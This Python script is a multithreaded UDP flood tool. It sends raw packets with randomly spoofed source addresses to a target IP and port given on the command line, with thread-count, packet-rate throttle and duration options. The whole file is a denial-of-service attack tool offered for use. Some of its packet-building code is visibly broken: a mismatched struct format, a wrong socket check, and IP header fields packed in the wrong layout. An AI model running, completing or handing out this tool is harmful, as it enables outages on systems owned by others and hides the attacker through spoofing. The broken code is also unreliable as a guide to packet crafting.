import socket
import random
import time
import threading
import struct
import sys

MAX_PACKET_SIZE = 4096
MAXTTL = 255
PHI = 0x9e3779b9
Q = [0] * 4096
c = 362436
floodport = 0
limiter = 0
pps = 0
sleeptime = 100

def init_rand(x):
    global Q
    Q[0] = x
    Q[1] = x + PHI
    Q[2] = x + PHI + PHI
    for i in range(3, 4096):
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i

def rand_cmwc():
    global c, Q
    t = 18782 * Q[4095] + c
    c = t >> 32
    x = t + c
    if x < c:
        x += 1
        c += 1
    Q[4095] = 0xfffffffe - x
    return Q[4095]

def csum(buf, count):
    sum = 0
    while count > 1:
        sum += struct.unpack("!H", buf[:2])[0]
        buf = buf[2:]
        count -= 2
    if count > 0:
        sum += buf[0]
    while sum >> 16:
        sum = (sum & 0xffff) + (sum >> 16)
    return ~sum & 0xffff

def udpcsum(iph, udph):
    pseudohead = struct.pack('!4s4sBBH', struct.pack('!I', iph['saddr']), struct.pack('!I', iph['daddr']),
                             0, 17, len(udph))
    pheader = pseudohead + udph
    return csum(pheader, len(pheader))

def setup_ip_header(iph, saddr):
    iph['ihl'] = 5
    iph['version'] = 4
    iph['tos'] = 0
    iph['tot_len'] = 20 + 8 + 25
    iph['id'] = 54321
    iph['frag_off'] = 0
    iph['ttl'] = MAXTTL
    iph['protocol'] = 17  # UDP
    iph['check'] = 0
    iph['saddr'] = struct.unpack("!I", socket.inet_aton(saddr))[0]

def setup_udp_header(udph):
    udph['source'] = random.randint(1024, 65535)
    udph['dest'] = floodport
    udph['len'] = 8 + 25
    udph['check'] = 0
    return udph

def flood(target):
    global pps
    datagram = bytearray(MAX_PACKET_SIZE)
    iph = {}
    udph = {}
    sin = (socket.inet_aton(target), floodport)

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    if s < 0:
        print("Could not open raw socket.")
        sys.exit(-1)

    setup_ip_header(iph, "192.168.3.100")
    udph = setup_udp_header(udph)
    iph['daddr'] = struct.unpack("!I", socket.inet_aton(target))[0]
    iph['check'] = csum(struct.pack("!BBHHHBBH4s4s", iph['version'], iph['ihl'], iph['tos'], iph['tot_len'], iph['id'],
                                    iph['frag_off'], iph['ttl'], iph['protocol'], iph['check'], struct.pack('!I', iph['saddr']),
                                    struct.pack('!I', iph['daddr'])), iph['tot_len'])

    init_rand(int(time.time()))
    i = 0
    while True:
        send_data = struct.pack('!BBHHH', iph['ihl'], iph['version'], iph['tos'], iph['tot_len'], iph['id'], iph['frag_off'],
                                iph['ttl'], iph['protocol'], iph['check'], struct.pack('!I', iph['saddr']),
                                struct.pack('!I', iph['daddr'])) + struct.pack('!HH', udph['source'], udph['dest']) + \
                   b'\xff' * 25
        s.sendto(send_data, sin)
        iph['saddr'] = rand_cmwc() & 0xFFFFFFFF
        iph['id'] = rand_cmwc() & 0xFFFFFFFF
        iph['check'] = csum(struct.pack("!BBHHHBBH4s4s", iph['version'], iph['ihl'], iph['tos'], iph['tot_len'], iph['id'],
                                        iph['frag_off'], iph['ttl'], iph['protocol'], iph['check'], struct.pack('!I', iph['saddr']),
                                        struct.pack('!I', iph['daddr'])), iph['tot_len'])
        udph['source'] = rand_cmwc() & 0xFFFF
        udph['check'] = 0
        udph['check'] = udpcsum(iph, udph)
        pps += 1
        if i >= limiter:
            i = 0
            time.sleep(sleeptime / 1000)
        i += 1

def main():
    if len(sys.argv) < 6:
        print(f"Invalid parameters!\nUsage: {sys.argv[0]} <target IP> <port> <number threads to use> <throttle, -1 for no limit> <time>")
        sys.exit(-1)

    global floodport
    floodport = int(sys.argv[2])
    num_threads = int(sys.argv[3])
    maxpps = int(sys.argv[4])
    multiplier = 20

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=flood, args=(sys.argv[1],))
        threads.append(t)
        t.start()

    for i in range(int(sys.argv[5]) * multiplier):
        time.sleep(1 / multiplier)
        if pps * multiplier > maxpps:
            global limiter
            limiter = max(0, limiter - 1)
        else:
            limiter += 1

if __name__ == "__main__":
    main()
